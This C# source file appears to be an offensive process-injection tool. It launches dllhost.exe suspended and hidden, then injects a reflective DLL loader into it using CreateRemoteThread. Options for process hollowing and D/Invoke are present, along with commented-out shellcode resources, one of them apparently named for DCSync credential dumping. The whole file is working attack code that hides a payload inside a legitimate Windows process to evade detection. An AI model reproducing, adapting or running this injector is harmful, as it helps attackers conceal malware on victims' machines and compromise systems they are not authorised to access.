using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using WinAPI;
using WinAPI.Wrapper;

namespace Inject
{
    internal class Program
    {
        public static string GetRunningExeName()
        {
            string processName = Process.GetCurrentProcess().MainModule.FileName;
            string exeName = System.IO.Path.GetFileName(processName);
            return exeName;
        }

        static void Main(string[] args)
        {
            //APIWrapper.Config.PreferedAccessType = WinAPI.Wrapper.APIAccessType.DInvoke;
            APIWrapper.Config.PreferedAccessType = WinAPI.Wrapper.APIAccessType.PInvoke;
            APIWrapper.Config.PreferedInjectionMethod = WinAPI.Wrapper.InjectionMethod.CreateRemoteThread;
            //APIWrapper.Config.PreferedInjectionMethod = WinAPI.Wrapper.InjectionMethod.ProcessHollowingWithAPC;

            string cmd = @"c:\windows\system32\dllhost.exe";
            //byte[] shellcode = Properties.Resources.Payload;
            //byte[] shellcode = Properties.Resources.dcsyn;
            byte[] reflectiveDll = File.ReadAllBytes("E:\\Share\\Projects\\C++\\CustomLoader\\x64\\Release\\RflDllAssemblyLoader.dll");
            ProcessCreationResult procResult = null;

            try
            {

                Console.WriteLine($"[?] WinAPIAccess = {APIWrapper.Config.PreferedAccessType}");

                IntPtr hToken = IntPtr.Zero;

                var creationParms = new ProcessCreationParameters()
                {
                    Command = cmd,
                    //
                    //
                    //RedirectOutput = true,
                    RedirectOutput = false,
                    CreateNoWindow = true,
                    CreateSuspended = true,
                };


                procResult = APIWrapper.CreateProcess(creationParms);

                Console.WriteLine($"[?] ProcessId = {procResult.ProcessId}");
                Console.WriteLine($"[?] ProcessHandle = {procResult.ProcessHandle}");
                Console.WriteLine($"[?] PipeHandle = {procResult.OutPipeHandle}");

                //APIWrapper.Inject(procResult.ProcessHandle, procResult.ThreadHandle, shellcode);
                var offset = WinAPI.Helper.ReflectiveLoaderHelper.GetReflectiveFunctionOffset(reflectiveDll, "ReflectiveFunction");
                APIWrapper.Inject(procResult.ProcessHandle, procResult.ThreadHandle, reflectiveDll, offset);

                if (procResult.ProcessId != 0 && creationParms.RedirectOutput)
                {
                    var process = Process.GetProcessById(procResult.ProcessId);
                    Console.WriteLine("[+] Result :");
                    APIWrapper.ReadPipeToEnd(procResult.OutPipeHandle, output => Console.Write(output));
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("[X] Oooops something went wrong....");
                Console.WriteLine(ex.ToString());
            }
            finally
            {
                if (procResult != null)
                {
                    APIWrapper.CloseHandle(procResult.ProcessHandle);
                    APIWrapper.CloseHandle(procResult.ThreadHandle);
                    APIWrapper.CloseHandle(procResult.OutPipeHandle);
                    //APIWrapper.KillProcess(procResult.ProcessId);
                }
            }
        }
    }
}
